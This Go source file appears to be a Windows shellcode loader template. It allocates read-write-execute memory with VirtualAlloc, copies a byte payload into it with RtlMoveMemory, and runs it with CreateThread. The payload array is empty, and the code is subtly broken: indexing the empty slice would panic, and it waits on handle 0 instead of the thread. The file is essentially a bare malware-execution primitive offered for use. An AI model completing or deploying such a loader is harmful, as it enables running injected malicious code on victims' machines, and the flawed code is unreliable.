package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func main() {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	createThread := kernel32.NewProc("CreateThread")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	var payload = []byte{}

	addr, _, err := virtualAlloc.Call(0, uintptr(len(payload)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		fmt.Println("Error: ", err)
		return
	}

	_, _, err = rtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&payload[0])), uintptr(len(payload)))
	if _, _, err = createThread.Call(0, 0, addr, 0, 0, 0); err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("Error: ", err)
		return
	}

	waitForSingleObject.Call(0, 0xFFFFFFFF)
}
